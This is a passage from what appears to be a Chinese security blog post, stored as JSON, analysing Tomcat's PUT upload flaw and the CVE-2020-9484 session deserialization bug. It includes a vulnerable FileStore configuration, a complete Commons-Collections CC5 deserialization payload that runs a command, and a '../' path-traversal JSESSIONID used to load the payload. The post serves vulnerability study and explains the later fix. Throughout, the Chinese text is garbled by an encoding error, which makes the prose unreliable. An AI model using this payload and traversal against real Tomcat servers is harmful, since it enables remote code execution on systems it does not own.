è½½è¿‡å¯¹åº”uriï¼Œé‚£ä¹ˆexistså°±æ˜¯trueï¼Œè·Ÿè¿›è°ƒç”¨çš„rebind()æ–¹æ³•ï¼š\nç»§ç»­è·Ÿè¿›è°ƒç”¨çš„rebind()æ–¹æ³•ï¼Œç„¶åæœ‰è°ƒç”¨äº†é‡è½½çš„rebind()æ–¹æ³•ï¼Œè·Ÿè¿›å¦‚ä¸‹ï¼š\nè¿™é‡Œå¾—baseæŒ‡å‘çš„å°±æ˜¯åº”ç”¨ç¨‹åºç›®å½•ä¸‹ï¼Œæ•…å†™å…¥æ–‡ä»¶åç›´æ¥å°±æ˜¯å¯ä»¥è®¿é—®çš„ï¼Œè¿™é‡Œå€¼å¾—ä¸€æçš„å°±æ˜¯Fileç±»çš„åˆå§‹åŒ–ï¼Œåœ¨å‰é¢æˆ‘ä»¬æåˆ°äº†é€šè¿‡åœ¨/shell.jspååŠ ä¸€ä¸ª/æ¥ç»•è¿‡ï¼Œé‡ç‚¹å°±æ˜¯è¿™ä¸ªFileçš„åˆå§‹åŒ–ï¼š\nè¿™é‡Œé€šè¿‡è°ƒç”¨normalize()æ–¹æ³•æ¥ä¿®æ­£äº†è·¯å¾„ï¼Œæ•…å¯ä»¥ä¸å½±å“åç»­æ“ä½œï¼Œåœ¨è¿™é‡Œå®Œæ•´æ‹¼æ¥äº†ä¸€ä¸ªè·¯å¾„+æ–‡ä»¶åã€‚\né€€å‡ºFileç±»çš„åˆå§‹åŒ–ï¼Œç„¶åè°ƒç”¨streamContent()æ–¹æ³•è·å–æ–‡ä»¶å†…å®¹ï¼Œå†å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼š\né€šè¿‡FileOutputStreamç±»æ¥å†™æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªwhileå¾ªç¯æ¥ç¡®ä¿å¯ä»¥è·å–åˆ°æ‰€æœ‰å†…å®¹ã€‚\nç”±æ­¤å®Œæ•´å†™å…¥äº†ä¸€ä¸ªæ–‡ä»¶ã€‚\né‚£ä¹ˆå†ç®€å•çœ‹ä¸€ä¸‹ä»é›¶å†™å…¥æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œéƒ½å¤§å·®ä¸å·®çš„ï¼Œè®²è®²ä¸åŒç‚¹å³å¯ï¼š\næ²¡æœ‰åŠ è½½è¿‡ä»è€Œå°†existsè®¾ç½®ä¸ºfalseï¼š\nç„¶åè°ƒç”¨bind()æ–¹æ³•ï¼š\nå†è°ƒç”¨bind()æ–¹æ³•ï¼š\nç„¶ååŒæ ·çš„æ˜¯å†æ¬¡è°ƒç”¨é‡è½½çš„bind()æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ï¼š åŒæ ·æ˜¯ç›´æ¥ç»è¿‡ä¿®æ­£åç›´æ¥å°†shell.jspæ‹¼æ¥åˆ°webç›®å½•ä¸‹çœ‹æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œä¸å­˜åœ¨ï¼Œæ•…ä¼šè°ƒç”¨rebind()æ–¹æ³•ï¼š\nåé¢å°±éƒ½æ˜¯ä¸€æ ·çš„äº†ï¼Œæœ€åå†™å…¥æ–‡ä»¶ï¼š\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nåé¢æ‰“æ–­ç‚¹çœ‹äº†ä¸€ä¸‹baseèµ‹å€¼çš„è°ƒç”¨æ ˆï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 setDocBase:127, FileDirContext (org.apache.naming.resources) resourcesStart:5247, StandardContext (org.apache.catalina.core) startInternal:5436, StandardContext (org.apache.catalina.core) start:145, LifecycleBase (org.apache.catalina.util) addChildInternal:899, ContainerBase (org.apache.catalina.core) addChild:875, ContainerBase (org.apache.catalina.core) addChild:652, StandardHost (org.apache.catalina.core) manageApp:1899, HostConfig (org.apache.catalina.startup) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) invoke:301, BaseModelMBean (org.apache.tomcat.util.modeler) invoke:819, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor) invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver) createStandardContext:618, MBeanFactory (org.apache.catalina.mbeans) createStandardContext:565, MBeanFactory (org.apache.catalina.mbeans) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) invoke:301, BaseModelMBean (org.apache.tomcat.util.modeler) invoke:819, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor) invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver) invoke:468, MBeanServerAccessController (com.sun.jmx.remote.security) doOperation:1468, RMIConnectionImpl (javax.management.remote.rmi) access$300:76, RMIConnectionImpl (javax.management.remote.rmi) run:1309, RMIConnectionImpl$PrivilegedOperation (javax.management.remote.rmi) doPrivileged:-1, AccessController (java.security) doPrivilegedOperation:1408, RMIConnectionImpl (javax.management.remote.rmi) invoke:829, RMIConnectionImpl (javax.management.remote.rmi) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) dispatch:323, UnicastServerRef (sun.rmi.server) run:200, Transport$1 (sun.rmi.transport) run:197, Transport$1 (sun.rmi.transport) doPrivileged:-1, AccessController (java.security) serviceCall:196, Transport (sun.rmi.transport) handleMessages:568, TCPTransport (sun.rmi.transport.tcp) run0:826, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp) lambda$run$256:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp) run:-1, 548121275 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1) doPrivileged:-1, AccessController (java.security) run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp) runWorker:1142, ThreadPoolExecutor (java.util.concurrent) run:617, ThreadPoolExecutor$Worker (java.util.concurrent) run:745, Thread (java.lang) é€šè¿‡è°ƒç”¨FileDirContextç±»çš„setDocBase()æ–¹æ³•æ¥ç»™baseèµ‹å€¼ï¼Œè¿™é‡Œå°±æ˜¯å°†å…¶èµ‹å€¼ä¸ºäº†webç›®å½•ã€‚\næ€»ç»“ ä»æ•´ä¸ªè¿‡ç¨‹æ¥çœ‹ï¼Œä»…ä»æ¼æ´åˆ©ç”¨æ¥çœ‹ï¼Œå…¶å®å¹¶ä¸å¤æ‚ï¼Œæ”¹ä¸€ä¸ªé…ç½®æ–‡ä»¶å…è®¸putæ–‡ä»¶ä¸Šä¼ å³å¯ï¼Œä½†æ˜¯éœ€è¦çš„æ˜¯å¯¹tomcatè¿è¡Œæ¶æ„çš„ç†Ÿæ‚‰ï¼Œæ¯”å¦‚ä¸ºä»€ä¹ˆè¦ä½¿ç”¨åˆ°DefaultServletç±»ï¼Œputæ–‡ä»¶ä¸Šä¼ æ˜¯æ€ä¹ˆå¯¹jspåç¼€çš„æ–‡ä»¶è¿›è¡Œå¤„ç†çš„ï¼Œæ€ä¹ˆç»•è¿‡ä»è€Œä½¿ç”¨è¿™ä¸ªç±»ï¼Œæ›´é‡è¦çš„æ˜¯éœ€è¦çŸ¥é“è¿™ä¸ªç±»çš„doPut()æ–¹æ³•çš„ä»£ç é€»è¾‘æ˜¯ä»€ä¹ˆï¼Œå†™å…¥çš„æ–‡ä»¶ä½äºå“ªé‡Œï¼Ÿéƒ½æ˜¯éœ€è¦è€ƒè™‘çš„ã€‚\nå¦‚ä½•ä¿®å¤å‘¢ï¼Ÿ\nå½“ç„¶å°†readonlyè®¾ç½®ä¸ºtrueå°±å¯ä»¥ç›´æ¥æœç»è¿™ç§æ¼æ´ï¼Œé‚£ä¹ˆé«˜ç‰ˆæœ¬ä»ä»£ç é€»è¾‘ä¸Šæ˜¯å¦æœ‰ä¿®æ”¹å‘¢ï¼Œåç»­æ¥çœ‹CVE-2025-24813çš„åˆ†ææ–‡ç« ã€‚\nSession ååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´ æ¥è¯´è¯´CVE-2020-9484ï¼ŒåŒæ—¶å€Ÿæ­¤æ¥äº†è§£ä¸€ä¸‹tomcatä¸­å¯¹sessonçš„å¤„ç†æ–¹å¼ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åç»­è¿˜çˆ†å‡ºæ¥ä¸€ä¸ªCVE-2021-25329ï¼Œç®—æ˜¯å¯¹CVE-2020-9484çš„è¡¥ä¸çš„ç»•è¿‡ï¼Œä½†ä¸€ç›´æ²¡æœ‰å…¬å¼€pocï¼Œè¿™é‡Œä¸æ¶‰åŠã€‚\næ¼æ´ç‰ˆæœ¬ï¼š\n10.0.0-M1 è‡³ 10.0.0-M4 9.0.0.M1 è‡³ 9.0.34 8.5.0 è‡³ 8.5.54 7.0.0 è‡³ 7.0.103 æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š\næ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å†…å®¹å’Œåç§° æœåŠ¡å™¨PersistenceManageré…ç½®ä¸­ä½¿ç”¨äº†FileStore æœåŠ¡å™¨PersistenceManageré…ç½®ä¸­è®¾ç½®äº†sessionAttributeValueClassNameFilterä¸ºNULLï¼Œæˆ–è€…ä½¿ç”¨äº†å…¶ä»–è¾ƒä¸ºå®½æ¾çš„è¿‡æ»¤å™¨ï¼Œå…è®¸æ”»å‡»è€…æä¾›ååºåˆ—åŒ–æ•°æ®å¯¹è±¡ æ”»å‡»è€…çŸ¥é“ä½¿ç”¨çš„FileStoreå­˜å‚¨ä½ç½®åˆ°å¯æ§æ–‡ä»¶çš„ç›¸å¯¹æ–‡ä»¶è·¯å¾„ æ¥ä¸‹æ¥ä»æ¼æ´çŸ¥è¯†ç‚¹ä»¥åŠæ¼æ´åŸç†è¿›è¡Œå¤ç°ã€‚\næŒä¹…åŒ–sessionæ˜¯ä»€ä¹ˆ tomcaté€šå¸¸é€šè¿‡ä¸¤ä¸ªsessionç®¡ç†ç±»æ¥å®ç°sessionçš„æŒä¹…åŒ–ï¼š org.apache.catalina.session.StandardManagerå’Œorg.apache.catalina.session.PersistentManagerã€‚\nè¿™é‡Œä¸»è¦è°ˆè°ˆPersistentManagerç±»ã€‚sessionï¼Œè¢«ç”¨äºå¯¹å½“å‰ä¼šè¯çš„ç”¨æˆ·èº«ä»½éªŒè¯ï¼Œå¹¶ä¸”sessionæ˜¯å­˜åœ¨æœ‰æ•ˆæœŸçš„ï¼Œè¶…è¿‡ä¸€å®šæ—¶é—´è¿™ä¸ªsessionå°±ä¸å†ç”Ÿæ•ˆã€‚é‚£ä¹ˆæŒä¹…åŒ–sessionæ˜¯ä»€ä¹ˆï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯è®©sessionæŒä¹…åŒ–ï¼ŒPersistentManagerç±»é€šå¸¸ä½¿ç”¨Storeå°†æ´»åŠ¨ä¼šè¯äº¤æ¢åˆ°ç£ç›˜ï¼Œå¦‚ä¸‹å‡ ç§æƒ…å†µå¯ä»¥ç”¨åˆ°æŒä¹…åŒ–sessionï¼š\nè·¨å®¹å™¨çš„é‡æ–°å¯åŠ¨æŒä¹…åŒ–ä¼šè¯ã€‚ å®¹é”™æ€§ï¼Œå°†ä¼šè¯å¤‡ä»½åœ¨ç£ç›˜ä¸Šï¼Œä»¥ä¾¿åœ¨å®¹å™¨æ„å¤–é‡å¯æˆ–å®•æœºçš„æƒ…å†µä¸‹è¿›è¡Œæ¢å¤ã€‚ é€šè¿‡å°†æ´»åŠ¨è¾ƒå°‘çš„ä¼šè¯äº¤æ¢åˆ°ç£ç›˜æ¥é™åˆ¶å†…å­˜ä¸­ä¿ç•™çš„æ´»åŠ¨ä¼šè¯çš„æ•°é‡ã€‚æ¯”å¦‚å½“å‰ç”¨æˆ·çš„è®¿é—®é‡å·¨å¤§ï¼Œå¤§é‡çš„sessionä¼šå ç”¨æœåŠ¡å™¨å¤§é‡çš„å†…å­˜ï¼Œæ­¤æ—¶å°±å¯ä»¥å°†è¾ƒé•¿æ—¶é—´æ²¡ä½¿ç”¨çš„sessionå­˜å‚¨è‡³ç£ç›˜ï¼Œç”¨ä»¥èŠ‚çœç©ºé—´ã€‚ å¦‚ä½•å­˜å‚¨çš„å‘¢ï¼Œåºåˆ—åŒ–å¯¹åº”çš„sessionå¯¹è±¡å†å­˜å‚¨ï¼Œä¹Ÿå°±æ˜¯éœ€è¦å¯¹åº”çš„sessionå¯¹è±¡éœ€è¦å®ç°Serializableæ¥å£ã€‚\nStoreæœ‰ä¸¤ç§ FileStore å’Œ JDBCStoreï¼ŒFileStoreæ˜¯å°†sessionå¯¹è±¡å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼ŒJDBCStoreåˆ™æ˜¯å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ã€‚ä»æ¼æ´åˆ©ç”¨è§’åº¦æ¥çœ‹ï¼Œè¿™é‡Œè¦åˆ©ç”¨åˆ°FileStoreã€‚\nç¯å¢ƒæ­å»ºåŠå¤ç° å…ˆåœ¨ideaä¸Šæ­å»ºä¸€ä¸ªtomcat9.0.20ç¯å¢ƒï¼Œç„¶ååœ¨tomcatæºç /conf/context.xmlæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 \u0026lt;Manager className=\u0026#34;org.apache.catalina.session.PersistentManager\u0026#34; saveOnRestart=\u0026#34;true\u0026#34; sessionAttributeValueClassNameFilter=\u0026#34;\u0026#34;\u0026gt; \u0026lt;Store className=\u0026#34;org.apache.catalina.session.FileStore\u0026#34; directory=\u0026#34;./sessions\u0026#34; /\u0026gt; \u0026lt;/Manager\u0026gt; ç”±æ­¤æ»¡è¶³äº†ä¸Šè¿°å‡ ä¸ªæ¼æ´æ¡ä»¶ï¼Œè§£æä¸€ä¸‹ä¸Šé¢çš„é…ç½®æ–‡ä»¶ï¼š\nè®¾ç½®äº†saveOnRestart ä¸ºtrueï¼Œå°±å¯ä»¥åœ¨tomcatå…³é—­å‰æŠŠæœ‰æ•ˆçš„sessionä¿å­˜ï¼Œé‡æ–°å¯åŠ¨åå†æ¬¡è½½å…¥ã€‚æ•…å…¶å®ä»è¿™ä¸ªcveçš„åˆ©ç”¨ç‚¹æ¥è¯´ï¼Œè®¾ç½®ä¸ºfalseä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\nsessionAttributeValueClassNameFilterè®¾ç½®ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è‡ªå·±æä¾›å¯¹åº”çš„sessionæ–‡ä»¶çš„éƒ¨åˆ†åç§°ã€‚\nç›®å½•è®¾ç½®ä¸ºäº†å½“å‰ç›®å½•çš„sessionsä¸‹ï¼Œé‚£ä¹ˆå°±ä¼šå°†æ–‡ä»¶å­˜å‚¨åˆ°$CATALINA_HOME/work/Catalina/hostname/webappname/sessions/sessionID.session\nè¿™é‡Œååºåˆ—åŒ–æ‰“ä¸€ä¸ªcc5ï¼Œæ•…åœ¨ideaçš„WEB-INF/libä¸­æ·»åŠ ccä¾èµ–å³å¯ï¼š\nç„¶åç”Ÿæˆä¸€ä¸ªåŒ…å«cc5åºåˆ—åŒ–çš„æ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileOutputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;open -a Calculator\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); Map hash = new HashMap(); Map lazy = LazyMap.decorate(hash,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); Object o = new BadAttributeValueExpException(null); Field x = BadAttributeValueExpException.class.getDeclaredField(\u0026#34;val\u0026#34;); x.setAccessible(true); x.set(o,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.session\u0026#34;)); out.writeObject(o); out.close(); } } ç„¶åå°†ç”Ÿæˆçš„ser.sessionæ–‡ä»¶æ”¾åˆ°/tmpç›®å½•ä¸‹ã€‚å†å¦‚ä¸‹æ‰“å³å¯ï¼š\næˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nåŸç†åˆ†æ æ‰“æ–­ç‚¹äºFileStoreç±»çš„load()æ–¹æ³•ï¼š æ­¤æ—¶çš„è°ƒç”¨æ ˆä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 load:212, FileStore (org.apache.catalina.session) loadSessionFromStore:764, PersistentManagerBase (org.apache.catalina.session) swapIn:714, PersistentManagerBase (org.apache.catalina.session) findSession:493, PersistentManagerBase (org.apache.catalina.session) doGetSession:2960, Request (org.apache.catalina.connector) getSessionInternal:2677, Request (org.apache.catalina.connector) invoke:460, AuthenticatorBase (org.apache.catalina.authenticator) invoke:139, StandardHostValve (org.apache.catalina.core) invoke:92, ErrorReportValve (org.apache.catalina.valves) invoke:678, AbstractAccessLogValve (org.apache.catalina.valves) invoke:74, StandardEngineValve (org.apache.catalina.core) service:343, CoyoteAdapter (org.apache.catalina.connector) service:408, Http11Processor (org.apache.coyote.http11) process:66, AbstractProcessorLight (org.apache.coyote) process:836, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1839, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1142, ThreadPoolExecutor (java.util.concurrent) run:617, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) è·Ÿè¿›file()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬é€šè¿‡é…ç½®æ–‡ä»¶è®¾ç½®directoryä¸º./sessionsï¼Œä»¥åŠç±»ä¸­é»˜è®¤çš„å˜é‡FILE_EXTä¸º.sessionï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å°†httpè¯·æ±‚ä¸­è®¾ç½®ä¸ºJSESSIONID=../../../../../../../../../../../../../../../../../../../../../../../../../tmp/serï¼Œæ‹¼æ¥åå°±å¯ä»¥åŒ¹é…åˆ°æˆ‘ä»¬æ”¾åœ¨tmpç›®å½•ä¸‹çš„ser.sessionæ–‡ä»¶ã€‚\næœ€åå¦‚å›¾å¯ä»¥çœ‹åˆ°æ­¤æ—¶æ‹¿åˆ°çš„fileè·¯å¾„ä¸ºï¼š\n1 /Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/1e112f7e-49f1-4f6d-8404-dc4563d75f0c/work/Catalina/localhost/tomcat9_0_20_Web_exploded/./sessions/../../../../../../../../../../../../../../../../../../../../../../../../../tmp/ser.session è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘å°†ser.sessionæ”¾åœ¨/tmpä¸‹çš„åŸå› ï¼Œæ²¡ææ‡‚ideaè¿è¡Œtomcatåæ€ä¹ˆå°†ser.sessionæ–‡ä»¶æ”¾åœ¨å…¶ä»–å¦‚$CATALINA_HOME/tempç›®å½•ä¸‹ï¼Œå¤šç©¿ç‚¹å³å¯ï¼Œå¹¶ä¸”è¿™é‡Œå…¶å®ç›´æ¥è®¾ç½®directoryä¸ºsessionså³å¯ï¼Œå†å›é€€å‡ºfile()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°æ˜¯å…ˆåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚å­˜åœ¨çš„è¯å°±æ˜¯å¸¸è§„çš„æ–‡ä»¶è¯»å–ç„¶åç”¨ä½œååºåˆ—åŒ–ï¼Œè·Ÿè¿›readObjectData()æ–¹æ³•ï¼Œå…¶ä¸­è°ƒç”¨çš„doReadObject()æ–¹æ³•ä¼šå¯¹æ•°æ®æµååºåˆ—åŒ–ï¼š ä»è€ŒæˆåŠŸè¿›è¡Œcc5çš„ååºåˆ—åŒ–ã€‚\næ€»ç»“ ä»æ•´ä¸ªè¿‡ç¨‹æ¥çœ‹ï¼Œç¡®å®è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹å¼æ¯”è¾ƒè‹›åˆ»ï¼Œé¦–å…ˆæœ€å…³é”®çš„ä¸€ç‚¹å°±æ˜¯éœ€è¦ç›®æ ‡ç¯å¢ƒå­˜åœ¨å†…å®¹ä»¥åŠåç§°å¯æ§çš„æ–‡ä»¶ï¼Œè¿˜éœ€è¦çŸ¥é“ç›®æ ‡æ–‡ä»¶ç›¸å¯¹è·¯å¾„æ¥æ–¹ä¾¿ç›®å½•ç©¿è¶Šï¼Œå…¶æ¬¡è¿˜éœ€è¦ä¸€äº›é…ç½®ç”¨äºå…è®¸æˆ‘ä»¬æŒ‡å®šåŠ è½½çš„sessionæ–‡ä»¶åã€‚ç¡®å®æ¯”è¾ƒæ¡ä»¶æ¯”è¾ƒå¤šã€‚\né‚£ä¹ˆæ¥çœ‹æ›´é«˜ç‰ˆæœ¬ä¸‹æ˜¯å¦‚ä½•ä¿®å¤çš„å‘¢ï¼Ÿä¸‹è½½9.0.35ç‰ˆæœ¬çš„tomcatæºç å†åƒä¹‹å‰é‚£æ ·æ‰“ä¸€ä¸‹ã€‚æ§åˆ¶å°ä¼šç›´æ¥å¼¹å‡ºè­¦å‘Šï¼š\n1 26-Sep-2025 20:52:44.376 è­¦å‘Š [http-nio-8083-exec-2] org.apache.catalina.session.FileStore.file Invalid persistence file [/Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/c95d0ef3-f2a9-4529-9363-81226b1de81c/work/Catalina/localhost/tomcat9_0_35_Web_exploded/sessions/../../../../../../../../../../../../../../../../../../../../../../../../../tmp/ser.session] for session ID [../../../../../../../../../../../../../../../../../../../../../../../../../tmp/ser] æ— æ•ˆçš„æŒä¹…åŒ–æ–‡ä»¶ï¼Œå¯¹æˆ‘ä»¬JSESSIONIDä¼ çš„å‚æ•°è¿›è¡Œäº†é™åˆ¶ã€‚è°ƒè¯•åˆ†æä¸€æ³¢ï¼ŒåŒæ ·è·Ÿè¿›FileStoreç±»çš„load()æ–¹æ³•ï¼Œå…¶è°ƒç”¨çš„file()æ–¹æ³•å‘ç”Ÿäº†å˜åŒ–ï¼š\nä»å›¾ä¸­æ³¨é‡Šå³å¯çœ‹å‡ºï¼Œè¿™é‡Œå°±æ˜¯åˆ¤æ–­fileçš„è·¯å¾„æ˜¯å¦åœ¨æ—¢å®šçš„sessionæ–‡ä»¶å‚¨å­˜ç›®å½•ä¸­ï¼ŒstorageDir.getCanonicalPath()çš„å€¼ä¸ºï¼š\n1 /Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/c95d0ef3-f2a9-4529-9363-81226b1de81c/work/Catalina/localhost/tomcat9_0_35_Web_exploded/sessions è€Œfile.getCanonicalPath()çš„å›æ˜¾ä¸ºï¼š\næ•…è‚¯å®šå› ä¸ºä¸ä¸€æ ·å¯¼è‡´ç›´æ¥æŠ›å‡ºå¼‚å¸¸ä»è€Œé€€å‡ºã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://archive.apache.org/dist/tomcat/tomcat-9/\n","date":"2025-09-27T21:51:34+08:00","permalink":"https://fupanc-w1n.github.io/p/tomcat-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"Tomcat PUTæ–‡ä»¶ä¸Šä¼ å’ŒSession ååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ"},{"content":"Tomcatå…³é”®çŸ¥è¯†äº†è§£ Tomcat æ˜¯ç”± Apache è½¯ä»¶åŸºé‡‘ä¼š å¼€å‘çš„ä¸€ä¸ªå¼€æºçš„ Java Web åº”ç”¨æœåŠ¡å™¨ï¼Œå±äº Jakarta é¡¹ç›®çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚å®ƒæ”¯æŒæœ€æ–°çš„ Servlet å’Œ JSP è§„èŒƒï¼Œèƒ½å¤Ÿè¿è¡ŒåŸºäº Java çš„åŠ¨æ€ Web åº”ç”¨ç¨‹åºã€‚\nå…³é”®æ–‡ä»¶åŠç›®å½•è¯´æ˜ tomcatæºç ç›®å½•è¯´æ˜ åœ¨apacheçš„tomcatå®˜ç½‘ä¸‹è½½çš„tomcat9æºç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„ç›®å½•ï¼š\næœ‰å‡ ä¸ªå…³é”®çš„ç›®å½•éœ€è¦è¯´æ˜ï¼š\n/binï¼šå¯åŠ¨ã€å…³é—­å’Œå…¶ä»–è„šæœ¬ï¼Œåœ¨linuxä¸­å°±æ˜¯ä½¿ç”¨startup.shæ–‡ä»¶æ¥å¯åŠ¨tomcatï¼Œwindowsåˆ™æ˜¯startup.batåŠŸèƒ½å‰¯æœ¬ã€‚ /confï¼šé…ç½®æ–‡ä»¶å’Œç›¸å…³çš„DTDã€‚é‡Œé¢æœ‰ä¸¤ä¸ªé‡è¦çš„æ–‡ä»¶ï¼Œserver.xmlå’Œweb.xmlï¼Œä¸¤ä¸ªé…ç½®æ–‡ä»¶å®šä¹‰äº†éå¸¸å¤šçš„è¿è¡Œç­–ç•¥ï¼Œæ¯”å¦‚server.xmlå°±å®šä¹‰äº†tomcatå¯¹å¤–æš´éœ²çš„ç«¯å£ï¼Œè€Œweb.xmlå°±å®šä¹‰äº†å°†*.jspçš„äº¤ç»™jspå¼•æ“è§£æç­‰ç­–ç•¥ã€‚ /logsï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œæ—¥å¿—æ–‡ä»¶ä½äºæ­¤å¤„ã€‚ /webappsï¼šè¿™æ˜¯Webåº”ç”¨ç¨‹åºæ‰€åœ¨çš„ä½ç½®ã€‚ /libï¼šå­˜æ”¾ä¸€äº›éœ€è¦çš„jaråŒ…ä¾èµ–èµ„æºã€‚ ç”±æ­¤åŸºæœ¬äº†è§£äº†ä¸€ä¸ªtomcatçš„åŸºæœ¬ç›®å½•ç»“æ„ã€‚\nwebåº”ç”¨ç¨‹åºç›®å½•è¯´æ˜ æˆ‘ä»¬å¯ä»¥å…ˆåœ¨ideaä¸Šæ­å»ºä¸€ä¸ªtomcatç”¨æ¥ç¼–è¾‘ä¸€ä¸ªwebç¨‹åºçš„æºç ï¼Œå¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„æ–‡ç« ï¼š\nhttps://fupanc-w1n.github.io/p/tomcat%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/\nç°åœ¨æ¥çœ‹webåº”ç”¨ç¨‹åºä¸‹çš„ç›®å½•å¸ƒå±€ï¼Œéœ€è¦çŸ¥é“å¦‚ä¸‹çš„ä¸€äº›ä¿¡æ¯ï¼š\n*.htmlã€*.jspç­‰ï¼šHTMLå’ŒJSPé¡µé¢ï¼Œä»¥åŠåº”ç”¨ç¨‹åºä¸­å®¢æˆ·ç«¯æµè§ˆå™¨å¿…é¡»å¯è§çš„å…¶ä»–æ–‡ä»¶ï¼ˆä¾‹å¦‚ JavaScriptã€æ ·å¼è¡¨æ–‡ä»¶å’Œå›¾åƒï¼‰ã€‚åœ¨è¾ƒå¤§çš„åº”ç”¨ç¨‹åºä¸­ï¼Œä½ å¯ä»¥é€‰æ‹©å°†è¿™äº›æ–‡ä»¶åˆ’åˆ†ä¸ºå­ç›®å½•å±‚æ¬¡ç»“æ„ï¼Œä½†å¯¹äºè¾ƒå°çš„åº”ç”¨ç¨‹åºï¼Œé€šå¸¸åªéœ€ä¸ºè¿™äº›æ–‡ä»¶ç»´æŠ¤ä¸€ä¸ªç›®å½•å³å¯ã€‚ /WEB-INF/web.xmlï¼šåº”ç”¨ç¨‹åºçš„Web åº”ç”¨ç¨‹åºéƒ¨ç½²æè¿°ç¬¦ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„é…ç½®æ–‡ä»¶ï¼Œæè¿°æ„æˆåº”ç”¨ç¨‹åºçš„ servlet å’Œå…¶ä»–ç»„ä»¶ï¼Œä»¥åŠä½ 